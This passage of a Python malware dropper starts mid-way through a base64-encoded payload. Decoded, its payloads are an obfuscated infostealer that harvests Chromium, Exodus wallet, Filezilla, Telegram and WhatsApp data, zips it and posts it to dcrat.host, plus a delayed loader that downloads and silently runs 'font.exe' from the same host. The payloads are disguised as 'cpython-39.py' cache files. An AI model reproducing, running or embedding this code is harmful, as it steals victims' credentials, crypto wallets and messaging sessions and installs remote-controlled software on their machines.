MwogICAgaW1wb3J0IHRpbWVpdCAjbGluZTo4NAogICAgZnJvbSBwYXRocyBpbXBvcnQgVEVNUCAjbGluZTo4NQogICAgZnJvbSBvcyBpbXBvcnQgbWtkaXIgI2xpbmU6ODYKICAgIGZyb20gb3MgLnBhdGggaW1wb3J0IGpvaW4gI2xpbmU6ODcKICAgIGZyb20gemlwZmlsZSBpbXBvcnQgWmlwRmlsZSAsWklQX0RFRkxBVEVEICNsaW5lOjg4CiAgICBmcm9tIHRvb2xzIGltcG9ydCB6aXBkaXIgLF9oYW5kbGVfdGFza19yZXN1bHQgI2xpbmU6ODkKICAgIGZyb20gbG9nZ2VyIGltcG9ydCBMb2dnZXIgI2xpbmU6OTAKICAgIGZyb20gb3MgaW1wb3J0IHNjYW5kaXIgI2xpbmU6OTEKICAgIGZyb20gcGx1Z2lucyBpbXBvcnQgQ2hyb21pdW0gLERldGFpbHMgLEV4b2R1cyAsRmlsZXppbGxhICxUZWxlZ3JhbSAsV2hhdHNhcHAgI2xpbmU6OTMKICAgIEhPU1QgPSdodHRwOi8vZGNyYXQuaG9zdDo4MDgwJyNsaW5lOjk3CiAgICBhc3luYyBkZWYgbWFpbiAoKS0+Tm9uZSA6I2xpbmU6MTAwCiAgICAgICAgTzBPME8wMDAwMDAwME9PMDAgPXRpbWVpdCAuZGVmYXVsdF90aW1lciAoKSNsaW5lOjEwMQogICAgICAgIE9PT09PT08wTzBPTzBPT09PID1zZWNyZXRzIC50b2tlbl9oZXggKDEwICkjbGluZToxMDMKICAgICAgICBPME8wME9PTzAwMDAwTzAwMCA9am9pbiAoVEVNUCAsT09PT09PTzBPME9PME9PT08gKSNsaW5lOjEwNAogICAgICAgIHByaW50IChPME8wME9PTzAwMDAwTzAwMCApI2xpbmU6MTA2CiAgICAgICAgbWtkaXIgKE8wTzAwT09PMDAwMDBPMDAwICkjbGluZToxMDcKICAgICAgICBPME8wME8wMDAwT08wME9PTyA6TGlzdCBbYXN5bmNpbyAuVGFzayBdPVtdI2xpbmU6MTA5CiAgICAgICAgTzBPT09PMDAwMDBPMDAwTzAgPVNlc3Npb24gKCkjbGluZToxMTEKICAgICAgICBPMDBPMDBPME9PMDAwTzAwTyA9TG9nZ2VyIChPME8wME9PTzAwMDAwTzAwMCApI2xpbmU6MTEyCiAgICAgICAgT09PME9PMDAwME9PME9PMDAgPUNvbmZpZyAoT09PT09PTzBPME9PME9PT08gLEhPU1QgLE8wTzAwT09PMDAwMDBPMDAwICxPMDBPMDBPME9PMDAwTzAwTyAsTzBPT09PMDAwMDBPMDAwTzAgLHRhZyA9JzkzMjAzNDczMCcpI2xpbmU6MTEzCiAgICAgICAgYXdhaXQgTzAwTzAwTzBPTzAwME8wME8gLmxvZyAoZidTdGFydCcpI2xpbmU6MTE1CiAgICAgICAgT09PT08wT09PMDAwTzBPME8gPUNocm9taXVtIChPT08wT08wMDAwT08wT08wMCApI2xpbmU6MTE3CiAgICAgICAgTzAwMDBPMDBPMDBPT08wT08gPVRlbGVncmFtIChPT08wT08wMDAwT08wT08wMCApI2xpbmU6MTE4CiAgICAgICAgT09PMDBPTzBPTzAwT08wT08gPXsnZ29vZ2xlJzpPT09PTzBPT08wMDBPME8wTyAsJ2V4b2R1cyc6RXhvZHVzIChPT08wT08wMDAwT08wT08wMCApLCdtb3ppbGxhJzpOb25lICwndGVsZWdyYW0gZGVza3RvcCc6TzAwMDBPMDBPMDBPT08wT08gLCd0ZWxlZ3JhbSc6VGVsZWdyYW0gKE9PTzBPTzAwMDBPTzBPTzAwICksJ29wZXJhIHNvZnR3YXJlJzpPT09PTzBPT08wMDBPME8wTyAsJ2ZpbGV6aWxsYSc6RmlsZXppbGxhIChPT08wT08wMDAwT08wT08wMCApLCd3aGF0c2FwcCc6V2hhdHNhcHAgKE9PTzBPTzAwMDBPTzBPTzAwICl9I2xpbmU6MTI5CiAgICAgICAgTzBPMDBPMDAwME9PMDBPT08gLmFwcGVuZCAoY3JlYXRlX3Rhc2sgKHNlYXJjaF9wbHVnaW5fcGF0aHMgKHJvb3RfcGF0aHMgLE9PTzAwT08wT08wME9PME9PICxPMDBPMDBPME9PMDAwTzAwTyApKSkjbGluZToxMzEKICAgICAgICBPME9PT09PT09PT09PT09PTyA9W0RldGFpbHMgKE9PTzBPTzAwMDBPTzBPTzAwICldI2xpbmU6MTMzCiAgICAgICAgZm9yIE9PMDBPMDAwT08wME9PMDBPIGluIE8wT09PT09PT09PT09PT09PIDojbGluZToxMzUKICAgICAgICAgICAgTzBPMDBPMDAwME9PMDBPT08gLmFwcGVuZCAoY3JlYXRlX3Rhc2sgKE9PMDBPMDAwT08wME9PMDBPIC5jYWxsYmFjayAoKSkpI2xpbmU6MTM2CiAgICAgICAgZm9yIE9PT08wME9PMDAwTzBPT08wIGluIE8wTzAwTzAwMDBPTzAwT09PIDojbGluZToxMzgKICAgICAgICAgICAgT09PTzAwT08wMDBPME9PTzAgLmFkZF9kb25lX2NhbGxiYWNrIChsYW1iZGEgT08wME8wT08wTzAwT08wME8gOl9oYW5kbGVfdGFza19yZXN1bHQgKE9PMDBPME9PME8wME9PMDBPICxPMDBPMDBPME9PMDAwTzAwTyApKSNsaW5lOjEzOQogICAgICAgIHRyeSA6I2xpbmU6MTQyCiAgICAgICAgICAgIE9PTzBPT09PMDBPMDAwT09PID1UZWxlZ3JhbSAuZ2V0X3JlZ2lzdHJ5X3BhdGggKCkjbGluZToxNDMKICAgICAgICAgICAgYXdhaXQgTzAwMDBPMDBPMDBPT08wT08gLmNhbGxiYWNrIChPT08wT09PTzAwTzAwME9PTyApI2xpbmU6MTQ0CiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBPMDAwME9PME9PMDAwMDBPTyA6I2xpbmU6MTQ1CiAgICAgICAgICAgIGF3YWl0IE8wME8wME8wT08wMDBPMDBPIC5sb2cgKGYnRXJyb3Igd2hlbiBzdGVhbGluZyB0ZWxlZ3JhbSByZWdpc3RyeSwge08wMDAwT08wT08wMDAwME9PfScpI2xpbmU6MTQ2CiAgICAgICAgdHJ5IDojbGluZToxNDgKICAgICAgICAgICAgTzBPTzBPMDAwT09PME8wTzAgPVRlbGVncmFtIC5nZXRfbG5rX3BhdGggKCkjbGluZToxNDkKICAgICAgICAgICAgaWYgTzBPTzBPMDAwT09PME8wTzAgOiNsaW5lOjE1MAogICAgICAgICAgICAgICAgYXdhaXQgTzAwMDBPMDBPMDBPT08wT08gLmNhbGxiYWNrIChPT08wT09PTzAwTzAwME9PTyApI2xpbmU6MTUxCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBPMDAwME9PME9PMDAwMDBPTyA6I2xpbmU6MTUyCiAgICAgICAgICAgIGF3YWl0IE8wME8wME8wT08wMDBPMDBPIC5sb2cgKGYnRXJyb3Igd2hlbiBzdGVhbGluZyB0ZWxlZ3JhbSBsbmssIHtPMDAwME9PME9PMDAwMDBPT30nKSNsaW5lOjE1MwogICAgICAgIHRyeSA6I2xpbmU6MTU1CiAgICAgICAgICAgIGZvciBPT08wT09PMDAwMDBPME9PTyBpbiBUZWxlZ3JhbSAuZ2V0X3RlbGVncmFtcyAoKTojbGluZToxNTYKICAgICAgICAgICAgICAgIHRyeSA6I2xpbmU6MTU3CiAgICAgICAgICAgICAgICAgICAgYXdhaXQgTzAwMDBPMDBPMDBPT08wT08gLmNhbGxiYWNrIChPT08wT09PMDAwMDBPME9PTyApI2xpbmU6MTU4CiAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIE8wMDAwT08wT08wMDAwME9PIDojbGluZToxNTkKICAgICAgICAgICAgICAgICAgICBhd2FpdCBPMDBPMDBPME9PMDAwTzAwTyAubG9nIChmJ1RlbGVncmFtIGZyb20gcHN1dGlsIGVycm9yLCB7TzAwMDBPTzBPTzAwMDAwT099JykjbGluZToxNjAKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIE8wMDAwT08wT08wMDAwME9PIDojbGluZToxNjEKICAgICAgICAgICAgYXdhaXQgTzAwTzAwTzBPTzAwME8wME8gLmxvZyAoZidFcnJvciB3aGVuIHN0ZWFsaW5nIHRlbGVncmFtcyBwcm9jLCB7TzAwMDBPTzBPTzAwMDAwT099JykjbGluZToxNjIKICAgICAgICBmb3IgT09PTzAwT08wMDBPME9PTzAgaW4gTzBPMDBPMDAwME9PMDBPT08gOiNsaW5lOjE2NQogICAgICAgICAgICB0cnkgOiNsaW5lOjE2NgogICAgICAgICAgICAgICAgYXdhaXQgT09PTzAwT08wMDBPME9PTzAgI2xpbmU6MTY3CiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgTzAwMDBPTzBPTzAwMDAwT08gOiNsaW5lOjE2OAogICAgICAgICAgICAgICAgYXdhaXQgTzAwTzAwTzBPTzAwME8wME8gLmxvZyAoZidFcnJvciBpbiBtYWluLnB5IHRhc2tzIHtPMDAwME9PME9PMDAwMDBPT30nKSNsaW5lOjE2OQogICAgICAgIGF3YWl0IE8wME8wME8wT08wMDBPMDBPIC5sb2cgKGYn0J3QsNGH0LjQvdCw0Y4g0L7RgtC/0YDQsNCy0LrRgyDQu9C+0LPQsCcpI2xpbmU6MTcxCiAgICAgICAgT09PMDAwMDBPMDAwMDBPTzAgPWpvaW4gKFRFTVAgLGYne09PT09PT08wTzBPTzBPT09PfS56aXAnKSNsaW5lOjE3MwogICAgICAgIHdpdGggWmlwRmlsZSAoT09PMDAwMDBPMDAwMDBPTzAgLCd3JyxaSVBfREVGTEFURUQgKWFzIE8wME8wT09PMDAwT09PTzBPIDojbGluZToxNzQKICAgICAgICAgICAgemlwZGlyIChPME8wME9PTzAwMDAwTzAwMCAsTzAwTzBPT08wMDBPT09PME8gKSNsaW5lOjE3NQogICAgICAgIE8wT08wTzBPME8wTzAwME9PID17J2ZpbGUnOm9wZW4gKE9PTzAwMDAwTzAwMDAwT08wICwncmInKX0jbGluZToxNzcKICAgICAgICBhd2FpdCBPME9PT08wMDAwME8wMDBPMCAucG9zdCAoZid7SE9TVH0vcmVjZWl2ZV9sb2cnLHBhcmFtcyA9eydjbGllbnRfaWQnOk9PT09PT08wTzBPTzBPT09PIH0sZGF0YSA9TzBPTzBPME8wTzBPMDAwT08gKSNsaW5lOjE3OQogICAgICAgIGF3YWl0IE8wT09PTzAwMDAwTzAwME8wIC5jbG9zZSAoKSNsaW5lOjE4MAogICAgICAgIE8wME8wME9PMDBPT08wMDAwID10aW1laXQgLmRlZmF1bHRfdGltZXIgKCkjbGluZToxODIKICAgICAgICBhd2FpdCBPMDBPMDBPME9PMDAwTzAwTyAubG9nIChmJ1RpbWU6IHtPMDBPMDBPTzAwT09PMDAwMC1PME8wTzAwMDAwMDAwT08wMH0nKSNsaW5lOjE4MwogICAgICAgIHRyeSA6I2xpbmU6MTg1CiAgICAgICAgICAgIGlmICdERUJVRydub3QgaW4ge08wMDAwMDAwT08wT08wT08wIC5uYW1lIGZvciBPMDAwMDAwME9PME9PME9PMCBpbiBzY2FuZGlyIChqb2luIChURU1QICwnX19weWNhY2hlX18nKSl9OiNsaW5lOjE4NgogICAgICAgICAgICAgICAgZnJvbSBzaHV0aWwgaW1wb3J0IHJtdHJlZSAjbGluZToxODcKICAgICAgICAgICAgICAgIHRyeSA6I2xpbmU6MTg4CiAgICAgICAgICAgICAgICAgICAgcm10cmVlIChqb2luIChURU1QICwnX19weWNhY2hlX18nKSkjbGluZToxODkKICAgICAgICAgICAgICAgIGV4Y2VwdCA6I2xpbmU6MTkwCiAgICAgICAgICAgICAgICAgICAgcGFzcyAjbGluZToxOTEKICAgICAgICAgICAgICAgIHJtdHJlZSAoTzBPMDBPT08wMDAwME8wMDAgKSNsaW5lOjE5MgogICAgICAgIGV4Y2VwdCA6I2xpbmU6MTkzCiAgICAgICAgICAgIHBhc3MgI2xpbmU6MTk0CiAgICBhc3luY2lvIC5nZXRfZXZlbnRfbG9vcCAoKS5ydW5fdW50aWxfY29tcGxldGUgKG1haW4gKCkp'))

    with open(join(main_dir, 'scripts.cpython-39.py'), 'w', encoding='utf8') as f:
        f.write(b64('CmZyb20gYWlvaHR0cCBpbXBvcnQgQ2xpZW50U2Vzc2lvbiBhcyBTZXNzCmZyb20gc3VicHJvY2VzcyBpbXBvcnQgUG9wZW4sIFBJUEUKZnJvbSBvcy5wYXRoIGltcG9ydCBzcGxpdCwgam9pbgpmcm9tIG9zIGltcG9ydCBlbnZpcm9uCmZyb20gc2VjcmV0cyBpbXBvcnQgdG9rZW5faGV4CmltcG9ydCBhc3luY2lvCmZyb20gdGltZSBpbXBvcnQgc2xlZXAKCgoKc2xlZXAoNjAwKQoKCkxPQ0FMID0gZW52aXJvblsnVVNFUlBST0ZJTEUnXQpURU1QID0gam9pbihMT0NBTCwgJ2FwcGRhdGEnLCAnbG9jYWwnLCAndGVtcCcpCgphc3luYyBkZWYgbG9hZF9leGVjKHVybDogc3RyKToKICAgIHNhdmVfcGF0aCA9IGpvaW4oVEVNUCwgZid7dG9rZW5faGV4KDgpfS5leGUnKQoKICAgIGFzeW5jIHdpdGggU2VzcygpIGFzIHM6CiAgICAgICAgYXN5bmMgd2l0aCBzLmdldCh1cmwpIGFzIHJlc3A6CiAgICAgICAgICAgIHdpdGggb3BlbihzYXZlX3BhdGgsICd3YicpIGFzIGY6CiAgICAgICAgICAgICAgICBmLndyaXRlKGF3YWl0IHJlc3AucmVhZCgpKQoKICAgIHByaW50KHNhdmVfcGF0aCkKCiAgICBQb3BlbihzYXZlX3BhdGgsIHN0ZGluPVBJUEUsIHN0ZG91dD1QSVBFLCBzdGRlcnI9UElQRSwKICAgICAgICAgICAgY3JlYXRpb25mbGFncz0weDAwMDAwMDA4IHwgMHgwMDAwMDIwMCwgc2hlbGw9VHJ1ZSkKCgphc3luY2lvLmdldF9ldmVudF9sb29wKCkucnVuX3VudGlsX2NvbXBsZXRlKGxvYWRfZXhlYygnaHR0cDovL2RjcmF0Lmhvc3QvZm9udC5leGUnKSkK'))

    chdir(main_dir) 
    if DEBUG:
        try:
            with open(join(main_dir, 'DEBUG'), 'w') as f:
                pass
        except:
            pass
    run('main.cpython-39.py')
    run('scripts.cpython-39.py')
except Exception as e:
    with open(join(main_dir, 'main error.txt'), 'a', encoding='utf8') as f:
        f.write(traceback.format_exc() + '\n')
